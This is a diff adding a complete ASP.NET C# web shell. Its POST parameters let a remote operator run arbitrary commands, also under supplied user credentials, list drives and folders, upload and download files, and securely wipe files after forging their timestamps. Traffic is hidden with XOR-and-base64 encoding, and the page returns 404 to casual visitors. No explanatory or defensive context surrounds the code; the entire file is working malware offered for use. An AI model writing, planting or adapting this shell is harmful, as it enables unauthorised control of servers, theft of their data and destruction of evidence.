@@ -1,0 +1,644 @@
+<%@ Language="CS" compilerOptions="/unsafe" %>
+
+<%@ Import Namespace="System" %>
+<%@ Import Namespace="System.Threading" %>
+<%@ Import Namespace="System.Web.UI.WebControls" %>
+<%@ Import Namespace="System.Diagnostics" %>
+<%@ Import Namespace="System.IO" %>
+<%@ Import Namespace="System.Web" %>
+<%@ Import Namespace="System.Web.UI" %>
+<%@ Import Namespace="System.Runtime.InteropServices" %>
+<%@ Import Namespace="System.Security.Principal" %>
+<%@ Import Namespace="System.Text" %>
+<%@ Import Namespace="System.Collections.Generic" %>
+<%@ Import Namespace="System.ComponentModel" %>
+<%@ Import Namespace="System.Security.Cryptography" %>
+
+
+<script language="CS" runat=server>
+
+	const uint BUFFER_SIZE	= 16384;
+	
+	public enum SECURITY_IMPERSONATION_LEVEL
+	{
+		SecurityAnonymous		= 0,
+		SecurityIdentification	= 1,
+		SecurityImpersonation	= 2,
+		SecurityDelegation		= 3
+	}
+
+	public enum TOKEN_TYPE
+	{
+		TokenPrimary		= 1,
+		TokenImpersonation	= 2
+	}
+	
+	public struct PROCESS_INFORMATION
+	{
+		public IntPtr	hProcess;
+		public IntPtr	hThread;
+		public uint		dwProcessId;
+		public uint		dwThreadId;
+	}
+
+	public struct STARTUPINFO
+	{
+		public uint		cb;
+		public String	lpReserved;
+		public String	lpDesktop;
+		public String	lpTitle;
+		public uint		dwX;
+		public uint		dwY;
+		public uint		dwXSize;
+		public uint		dwYSize;
+		public uint		dwXCountChars;
+		public uint		dwYCountChars;
+		public uint		dwFillAttribute;
+		public uint		dwFlags;
+		public short	wShowWindow;
+		public short	cbReserved2;
+		public IntPtr	lpReserved2;
+		public IntPtr	hStdInput;
+		public IntPtr	hStdOutput;
+		public IntPtr	hStdError;
+	}
+
+	public struct SECURITY_ATTRIBUTES
+	{
+		public Int32	length;
+		public IntPtr	lpSecurityDescriptor;
+		public bool		bInheritHandle;
+	}
+
+	private Int32	GENERIC_ALL_ACCESS			= 0x10000000;
+	private uint	INFINITE					= 0xFFFFFFFF;
+	private uint	STARTF_USESHOWWINDOW		= 0x00000001;
+	private uint	STARTF_USESTDHANDLES		= 0x00000100;
+	private uint	CREATE_NO_WINDOW			= 0x08000000;
+	private uint	CREATE_UNICODE_ENVIRONMENT	= 0x00000400;
+	private short	SW_HIDE						= 0x00000000;
+	private Int32	HANDLE_FLAG_INHERIT			= 0x00000001;
+	
+	[DllImport("kernel32.dll")]
+	static extern bool			WaitForSingleObject(IntPtr handle, uint milliseconds);
+	
+	[DllImport("advapi32.dll")]
+	static extern bool			LogonUserA(String username, String domain, String password, Int32 logonType, Int32 logonprovider, ref IntPtr token);
+	
+	[DllImport("kernel32.dll")]
+	static extern bool	CloseHandle(IntPtr handle);
+	
+	[DllImport("advapi32.dll")]
+	static extern bool			CreateProcessAsUser(IntPtr hToken, String lpApplicationName, String lpCommandLine,ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes,bool bInheritHandle, Int32 dwCreationFlags, IntPtr lpEnvrionment,String lpCurrentDirectory, ref STARTUPINFO lpStartupInfo,ref PROCESS_INFORMATION lpProcessInformation);
+	
+	[DllImport("advapi32.dll")]
+	static extern bool			DuplicateTokenEx(IntPtr hExistingToken, Int32 dwDesiredAccess,ref SECURITY_ATTRIBUTES lpThreadAttributes,Int32 ImpersonationLevel, Int32 dwTokenType,ref IntPtr phNewToken);
+	
+	[DllImport("kernel32.dll")]
+	static extern bool			CreatePipe(out IntPtr phReadPipe, out IntPtr phWritePipe, ref SECURITY_ATTRIBUTES lpPipeAttributes, uint nSize);
+	
+	[DllImport("kernel32.dll")]
+	static extern unsafe bool	ReadFile(IntPtr hfile, void * pBuffer, Int32 NumberOfBytesToRead, Int32* pNumberOfBytesRead, Int32 pOverlapped);
+
+	[DllImport("kernel32.dll")]
+	static extern bool			SetHandleInformation(IntPtr hObject, Int32 dwMask, uint dwFlags);
+
+	[DllImport("kernel32.dll")]
+	static extern uint			GetLastError();
+	
+	[DllImport("kernel32.dll")]
+	static extern bool			GetDiskFreeSpace(String lpRootPathName,out uint lpSectorsPerCluster, out uint lpBytesPerSector, out uint lpNumberOfFreeClusters, out uint lpTotalNumberOfClusters);
+
+
+
+	public unsafe Int32 ReadBytes(byte[] OutputBuffer, Int32 Count, IntPtr PipeToReadFrom, ref Int32 dwBytesRead)
+	{
+		try
+		{
+			fixed(byte * TempPointer	= OutputBuffer)
+			{
+				fixed(int * p = &dwBytesRead)
+				{
+					ReadFile(PipeToReadFrom, TempPointer, Count, p, 0);
+				}
+				return (Int32)GetLastError();
+			}
+		}
+		catch
+		{
+			return -1;
+		}
+	}
+
+	
+	public String RunCmdAsUser(String Username, String Password, String Domain, String Command, String CurrentWorkingDir)
+	{
+		try
+		{
+			STARTUPINFO			StartupInfo			= new STARTUPINFO();
+			SECURITY_ATTRIBUTES	SecurityAttributes	= new SECURITY_ATTRIBUTES();
+			PROCESS_INFORMATION	ProcessInfo			= new PROCESS_INFORMATION();
+			IntPtr				hReadIn				= IntPtr.Zero;
+			IntPtr				hReadOut			= IntPtr.Zero;
+			IntPtr				hWriteIn			= IntPtr.Zero;
+			IntPtr				hWriteOut			= IntPtr.Zero;
+			IntPtr				OriginalToken		= IntPtr.Zero;
+			IntPtr				DuplicatedToken		= IntPtr.Zero;
+			Int32				dwBytesRead			= 0;
+			Int32				LastError			= 0;
+			String				OutputMessage		= "";
+			byte[]				OutputBuffer		= new byte[BUFFER_SIZE];
+			Thread				PipeReadingThread	= null;
+
+			if("" == Username)
+			{
+				OriginalToken = WindowsIdentity.GetCurrent().Token;
+			}
+			else
+			{			
+				if(false == LogonUserA(Username, Domain, Password, 2, 0, ref OriginalToken))
+				{
+					return String.Format("Last Error LogonUserA: {0}", GetLastError());
+				}
+			}
+			
+			SecurityAttributes.bInheritHandle		= true;
+			SecurityAttributes.lpSecurityDescriptor	= IntPtr.Zero;
+			SecurityAttributes.length				= Marshal.SizeOf(typeof(SECURITY_ATTRIBUTES));
+			
+			if(false == CreatePipe(out hReadOut, out hWriteOut, ref SecurityAttributes, 0))
+			{
+				return String.Format("Last Error CreatePipe: {0}", GetLastError());
+			}
+			
+			if(false == CreatePipe(out hReadIn, out hWriteIn, ref SecurityAttributes, 0))
+			{
+				return String.Format("Last Error CreatePipe: {0}", GetLastError());
+			}
+	
+			if(false == SetHandleInformation(hReadOut, HANDLE_FLAG_INHERIT, 0))
+			{
+				return String.Format("Last Error SetHandleInformation: {0}", GetLastError());
+			}
+			
+			if(false == SetHandleInformation(hWriteIn, HANDLE_FLAG_INHERIT, 0))
+			{
+				return String.Format("Last Error SetHandleInformation: {0}", GetLastError());
+			}
+
+			StartupInfo.cb			= (uint)Marshal.SizeOf(typeof(STARTUPINFO));
+			StartupInfo.dwFlags		= STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+			StartupInfo.wShowWindow	= SW_HIDE;
+			StartupInfo.hStdOutput	= hWriteOut;
+			StartupInfo.hStdError	= hWriteOut;
+			StartupInfo.hStdInput	= hWriteIn;
+
+			if(false == DuplicateTokenEx(OriginalToken, GENERIC_ALL_ACCESS, ref SecurityAttributes, (Int32)SECURITY_IMPERSONATION_LEVEL.SecurityIdentification, (Int32)TOKEN_TYPE.TokenPrimary, ref DuplicatedToken))
+			{
+				CloseHandle(OriginalToken);
+				return String.Format("Last Error DuplicateTokenEx: {0}", GetLastError());
+			}
+			
+			if(false == CloseHandle(OriginalToken))
+			{
+				CloseHandle(OriginalToken);
+				return String.Format("Last Error CloseHandle: {0}", GetLastError());
+			}
+
+			if(false == CreateProcessAsUser(DuplicatedToken, null, @"cmd /c " + Command, ref SecurityAttributes, ref SecurityAttributes, true, 0, IntPtr.Zero, CurrentWorkingDir, ref StartupInfo, ref ProcessInfo))
+			{
+				CloseHandle(DuplicatedToken);
+				return String.Format("Last Error CreateProcessAsUser: {0}", GetLastError());
+			}
+			
+			if(false == CloseHandle(DuplicatedToken))
+			{
+				CloseHandle(OriginalToken);
+				return String.Format("Last Error CloseHandle: {0}", GetLastError());
+			}
+			
+			PipeReadingThread = new Thread(
+			delegate()
+			{
+				do
+				{	
+					LastError = ReadBytes(OutputBuffer, OutputBuffer.Length, hReadOut, ref dwBytesRead);
+					
+					if(LastError == 109)
+					{
+						break;
+					}
+					
+					OutputMessage = OutputMessage + Encoding.UTF8.GetString(OutputBuffer, 0, dwBytesRead);
+					Array.Clear(OutputBuffer, 0, OutputBuffer.Length);
+				} while (LastError == 0);
+			});
+			
+			PipeReadingThread.Start();
+			WaitForSingleObject(ProcessInfo.hProcess, INFINITE);
+			
+			if(false == CloseHandle(hWriteOut))
+			{
+				CloseHandle(OriginalToken);
+				return String.Format("Last Error CloseHandle: {0}", GetLastError());
+			}
+			
+			PipeReadingThread.Join();
+
+			return OutputMessage;
+		}
+		catch(Exception Exc)
+		{
+			return Exc.Message;
+		}
+	}
+
+
+	public String DecodeRequestString(String RequestString)
+	{
+		try
+		{
+			String DecodedString = Encoding.UTF8.GetString(Xorify(Convert.FromBase64String(RequestString.Replace('-','+').Replace('_','/'))));
+			
+			return DecodedString;
+		}
+		catch(Exception Exc)
+		{
+			throw new Exception(String.Format("DecodeRequestString Exception : {0}", Exc.Message));
+		}
+	}
+	
+	
+	public String EncodeResponseString(String ResponseString)
+	{
+		//return ResponseString;
+		try
+		{
+			String	EncodedString = Convert.ToBase64String(Encoding.UTF8.GetBytes(Xorify(ResponseString))).Replace('_','/').Replace('-','+');
+
+			return EncodedString;
+		}
+		catch(Exception Exc)
+		{
+			throw new Exception(String.Format("EncodeResponseString Exception : {0}", Exc.Message));
+		}
+	}
+	
+
+	public String Xorify(String StringToXor)
+	{
+		StringBuilder	inSb	= new StringBuilder(StringToXor);
+		StringBuilder	outSb	= new StringBuilder(StringToXor.Length);
+		Int32			I		= 0;
+		
+		for (I = 0; I < inSb.Length; I++)
+		{
+			outSb.Append((Char)((Char)inSb[I] ^ 123));
+		}
+		
+		return outSb.ToString();
+	}
+
+	
+	public byte[]  Xorify(byte[] StringToXor)
+	{
+		Int32	I	= 0;
+		
+		for (I = 0; I < StringToXor.Length; I++)
+		{
+			StringToXor[I] = (byte)((Int32)StringToXor[I] ^ 123);
+		}
+		
+		return StringToXor;
+	}
+	
+	
+	public String GetDirList(String Directory)
+	{
+		try
+		{
+			String			DirList	= "";	
+			DirectoryInfo	DirInfo	= new DirectoryInfo(Directory);
+			
+			foreach(DirectoryInfo CurrentDirectory in DirInfo.GetDirectories())
+			{
+				DirList	+= String.Format("{0}{1,18:n} {2}\n", CurrentDirectory.CreationTime.ToString(@"MM/dd/yyyy  hh:mm tt"), "<DIR>", CurrentDirectory.Name);
+			}
+
+			foreach (FileInfo CurrentFile in DirInfo.GetFiles())
+			{
+				DirList	+= String.Format("{0}{1,18:n} {2}\n", CurrentFile.CreationTime.ToString(@"MM/dd/yyyy  hh:mm tt"), CurrentFile.Length, CurrentFile.Name);
+			}
+			
+			return DirList;
+		}
+		catch(Exception Exc)
+		{
+			throw new Exception(String.Format("GetDirList Exception : {0}", Exc.Message));
+		}
+	}
+	
+	
+	public String GetDrivesList()
+	{
+		try
+		{
+			String	DrivesNames	= "";
+			
+			foreach(DriveInfo CurrentDrive in DriveInfo.GetDrives())
+			{
+				DrivesNames	+= String.Format("\n\nDrive {0}\n", CurrentDrive.Name);
+				DrivesNames	+= String.Format("  File type: {0}\n", CurrentDrive.DriveType);
+				
+				if(true == CurrentDrive.IsReady)
+				{
+					DrivesNames	+= String.Format("  Volume label: {0}\n", CurrentDrive.VolumeLabel);
+					DrivesNames	+= String.Format("  File system: {0}\n", CurrentDrive.DriveFormat);
+					DrivesNames	+= String.Format("  Total available space:          {0, 22:N} bytes\n", CurrentDrive.TotalFreeSpace);
+					DrivesNames	+= String.Format("  Total size of drive:            {0, 22:N} bytes\n", CurrentDrive.TotalSize);
+				}
+			}
+			
+			return DrivesNames;
+		}
+		catch(Exception Exc)
+		{
+			throw new Exception(String.Format("GetDrivesList Exception : {0}", Exc.Message));
+		}
+	}
+
+	
+	public String DeleteFile(String FilePath, Int32 Passes)
+	{
+		try
+		{
+			Int32						NumberOfSectors			= 0;
+			byte[]						TempBuffer				= null;
+			RNGCryptoServiceProvider	RNGCryptoProvider		= null;
+			FileStream					InputStream				= null;
+			Int32						CurrentPass				= 0;
+			Int32						SectorsWritten			= 0;
+			DateTime					DateTimeStruct			= new DateTime(2037, 1, 1, 0, 0, 0);
+			FileInfo					FileInfoStruct			= null;
+			UInt32						SectorsPerCluster		= 0;
+			UInt32						BytesPerSector			= 0;
+			UInt32						NumberOfFreeClusters	= 0;
+			UInt32						TotalNumberOfClusters	= 0;
+
+			if(false == File.Exists(FilePath))
+			{
+				return "File does not exist: " + FilePath;
+			}
+			
+			GetDiskFreeSpace(null, out SectorsPerCluster, out BytesPerSector, out NumberOfFreeClusters, out TotalNumberOfClusters);
+
+			// Set the files attributes to normal in case it's read-only.
+			File.SetAttributes(FilePath, FileAttributes.Normal);
+			
+			FileInfoStruct = new FileInfo(FilePath);
+			
+			// Calculate the total number of sectors in the file.
+			NumberOfSectors = (Int32)Math.Ceiling((double)(FileInfoStruct.Length / BytesPerSector));
+			
+			// Create a dummy-buffer the size of a sector.
+			TempBuffer = new byte[512];
+
+			// Create a cryptographic Random Number Generator.
+			// This is what I use to create the garbage data.
+			RNGCryptoProvider = new RNGCryptoServiceProvider();
+
+			// Open a FileStream to the file.
+			InputStream = new FileStream(FilePath, FileMode.Open);
+			for (CurrentPass = 0; CurrentPass < Passes; CurrentPass++)
+			{
+				// Go to the beginning of the stream
+				InputStream.Position = 0;
+
+				// Loop all sectors
+				for (SectorsWritten = 0; SectorsWritten < NumberOfSectors; SectorsWritten++)
+				{
+					// Fill the dummy-buffer with random data
+					RNGCryptoProvider.GetBytes(TempBuffer);
+					// Write it to the stream
+					InputStream.Write(TempBuffer, 0, TempBuffer.Length);
+				}
+			}
+			
+			// Truncate the file to 0 bytes.
+			// This will hide the original file-length if you try to recover the file.
+			InputStream.SetLength(0);
+			// Close the stream.
+			InputStream.Close();
+
+			// As an extra precaution I change the dates of the file so the
+			// original dates are hidden if you try to recover the file.
+			File.SetCreationTime(FilePath, DateTimeStruct);
+			File.SetLastAccessTime(FilePath, DateTimeStruct);
+			File.SetLastWriteTime(FilePath, DateTimeStruct);
+			File.SetCreationTimeUtc(FilePath, DateTimeStruct);
+			File.SetLastAccessTimeUtc(FilePath, DateTimeStruct);
+			File.SetLastWriteTimeUtc(FilePath, DateTimeStruct);
+
+			// Finally, delete the file
+			File.Delete(FilePath);
+			
+			return "File successfuly deleted";
+		}
+		catch(Exception Exc)
+		{
+			throw new Exception(String.Format("DeleteFile Exception : {0}", Exc.Message));
+		}
+	}
+	
+	
+	public String UploadFile(String FilePath, byte[] FileData)
+	{
+		try
+		{
+			BinaryWriter	BinaryWriterInst	= null;
+			
+			if(true == File.Exists(FilePath))
+			{
+				return "File does exist, delete first";
+			}
+
+			BinaryWriterInst = new BinaryWriter(File.Open(FilePath, FileMode.CreateNew, FileAccess.Write));
+			BinaryWriterInst.Write(FileData);
+			BinaryWriterInst.Close();
+			
+			return "File uploaded successfuly";
+		}
+		catch(Exception Exc)
+		{
+			throw new Exception(String.Format("UploadFile Exception : {0}", Exc.Message));
+		}
+	}
+	
+	
+	public String DownloadFile(String FilePath)
+	{
+		try
+		{
+			FileStream		FileStreamInst		= null;
+			BinaryReader	BinaryReaderInst	= null;
+			byte[]			FileData			= null;
+			
+			if(false == File.Exists(FilePath))
+			{
+				throw new Exception("File does not exist");
+			}
+
+			FileStreamInst		= new FileStream(FilePath, FileMode.Open, FileAccess.Read);
+			BinaryReaderInst	= new BinaryReader(FileStreamInst);
+			FileData			= BinaryReaderInst.ReadBytes((Int32)FileStreamInst.Length);
+			BinaryReaderInst.Close();
+			FileStreamInst.Close();
+			
+			return Convert.ToBase64String(Xorify(FileData));
+		}
+		catch(Exception Exc)
+		{
+			throw new Exception(String.Format("DownloadFile Exception : {0}", Exc.Message));
+		}
+	}
+	
+</script>
+
+
+<%
+
+	const String ChgCurWorkDirParamName		= "path";
+	const String UploadFileParamName		= "up";
+	const String UploadFileDataParamName	= "fd";
+	const String DownloadFileParamName		= "dl";
+	const String DeleteFileParamName		= "del";
+	const String DirListParamName			= "dir";
+	const String RunCmdParamName			= "r";
+	const String RunCmdAsParamName			= "rs";
+	const String UsernameParamName			= "un";
+	const String PasswordParamName			= "ps";
+	const String DomainParamName			= "dn";
+	const String DrivesListParamName		= "dv";
+	const String CurrentPathParamName		= "csp";
+
+	
+	String CurrentWorkingDir = "";
+
+	if(Request.Form[ChgCurWorkDirParamName] != null && Request.Form[ChgCurWorkDirParamName].Length > 0)
+	{
+		CurrentWorkingDir = DecodeRequestString(Request.Form[ChgCurWorkDirParamName]);
+	}
+	else
+	{
+		CurrentWorkingDir = @"c:\windows\temp";
+	}
+
+	Response.ClearContent();
+	
+	if(Request.Form[DrivesListParamName] != null)
+	{
+		Response.Write(EncodeResponseString(GetDrivesList()));
+	}
+	
+	else if(Request.Form[UploadFileParamName] != null && Request.Form[UploadFileParamName].Length > 0)
+	{
+		String	FileUploadPath	= DecodeRequestString(Request.Form[UploadFileParamName]);
+		byte[]	FileData		= Xorify(Convert.FromBase64String(Request.Form[UploadFileDataParamName].Replace('-','+').Replace('_','/')));
+
+		try
+		{
+			Response.Write(EncodeResponseString(UploadFile(FileUploadPath, FileData)));
+		}
+		catch(Exception Exc)
+		{
+			Response.Write(EncodeResponseString(Exc.Message));
+		}
+	}
+
+	else if(Request.Form[CurrentPathParamName] != null)
+	{
+		Response.Write(EncodeResponseString(Request.PhysicalPath));
+	}
+	
+	else if(Request.Form[DirListParamName] != null && Request.Form[DirListParamName].Length > 0)
+	{
+		String	DirList	= DecodeRequestString(Request.Form[DirListParamName]);
+
+		try
+		{
+			Response.Write(EncodeResponseString(GetDirList(DirList)));
+		}
+		catch(Exception Exc)
+		{
+			Response.Write(EncodeResponseString(Exc.Message));
+		}
+	}
+	
+	else if(Request.Form[DeleteFileParamName] != null && Request.Form[DeleteFileParamName].Length > 0)
+	{
+		String	FileToDelete	= DecodeRequestString(Request.Form[DeleteFileParamName]);
+
+		try
+		{
+			Response.Write(EncodeResponseString(DeleteFile(FileToDelete, 7)));
+		}
+		catch(Exception Exc)
+		{
+			Response.Write(EncodeResponseString(Exc.Message));
+		}
+	}
+	
+	else if(Request.Form[RunCmdParamName] != null && Request.Form[RunCmdParamName].Length > 0)
+	{
+		String CmdToRun	= DecodeRequestString(Request.Form[RunCmdParamName]);
+		
+		try
+		{
+			Response.Write(EncodeResponseString(RunCmdAsUser("","","",CmdToRun,CurrentWorkingDir)));
+		}
+		catch(Exception Exc)
+		{
+			Response.Write(EncodeResponseString(Exc.Message));
+		}
+	}
+	
+	else if(Request.Form[RunCmdAsParamName] != null && Request.Form[RunCmdAsParamName].Length > 0)
+	{
+		String	CmdToRun	= DecodeRequestString(Request.Form[RunCmdAsParamName]);
+		String	Username	= DecodeRequestString(Request.Form[UsernameParamName]);
+		String	Password	= DecodeRequestString(Request.Form[PasswordParamName]);
+		String	Domain		= DecodeRequestString(Request.Form[DomainParamName]);
+
+		try
+		{
+			Response.Write(EncodeResponseString(RunCmdAsUser(Username, Password, Domain, CmdToRun, CurrentWorkingDir)));
+		}
+		catch(Exception Exc)
+		{
+			Response.Write(EncodeResponseString(Exc.Message));
+		}
+	}
+	
+	else if(Request.Form[DownloadFileParamName] != null && Request.Form[DownloadFileParamName].Length > 0)
+	{
+		String	FileToDown	= DecodeRequestString(Request.Form[DownloadFileParamName]);
+		
+		try
+		{
+			Response.Write(DownloadFile(FileToDown));
+		}
+		catch(Exception Exc)
+		{
+			Response.Write(EncodeResponseString(Exc.Message));
+		}
+	}
+	
+	else
+	{
+		Response.StatusCode = 404;
+		//Response.Write("<form method=post><input type=hidden name=csp value=1><input type=submit></form>");
+	}
+	
+	Response.Write("");
+	Response.End();
+%>
